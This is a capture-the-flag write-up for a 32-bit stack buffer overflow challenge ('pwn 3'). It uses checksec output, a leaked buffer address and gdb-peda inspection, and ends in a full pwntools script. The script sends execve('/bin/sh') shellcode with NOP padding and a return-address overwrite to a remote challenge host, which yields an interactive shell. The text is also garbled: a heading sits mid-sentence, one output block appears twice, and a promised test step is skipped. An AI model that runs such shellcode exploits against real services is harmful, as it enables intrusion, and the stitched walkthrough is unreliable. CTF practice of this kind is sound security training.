```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```
Only one thing immediately stands out as different in this binary.  The NX flag is now disabled.  Immediately this gives us a hint that the solution to this challenge may be a simple shellcode based buffer overflow.

```bash
Welcome to the New Echo application 2.0! 
Changelog: 
- Less deprecated flag printing functions! 
- New Random Number Generator! 

Your random number 0xffffd1da! 
Now what should I echo?
```

You see that 'random number'?  Just by doing pwnables before, I bet that's a fixed location within the buffer, without even having to look at the disassembly.  To confirm this we just past in a pattern, halt excution and examine the memory at that location.**pwn 3: 75 points**
```bash
Welcome to the New Echo application 2.0! 
Changelog: 
- Less deprecated flag printing functions! 
- New Random Number Generator! 

Your random number 0xffffd1da! 
Now what should I echo?
```

```gdb
gdb-peda$ x/10x 0xffffd1da 
0xffffd1da:	0x41	0x41	0x41	0x25	0x41	0x41	0x73	0x41 
0xffffd1e2:	0x41	0x42 
gdb-peda$ pattern offset 0x25414141 
625033537 found at offset: 0 
```
Sure enough, it's the memory location of the buffer.  Now we'll just pass in a long pattern to see if we can get EIP overwrite.
```python
from pwn import * 
buff = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 

r = remote('pwn.ctf.tamu.edu',4323) 
r.recvuntil('New Random Number Generator!') 

ret = (r.recvuntil('!').split(' ')[-1][:-1]) 
ret = p32(int(ret,16))

 
r.sendafter('?', buff.ljust(242,'\x90')+ret+'\n') 
r.interactive() 
```
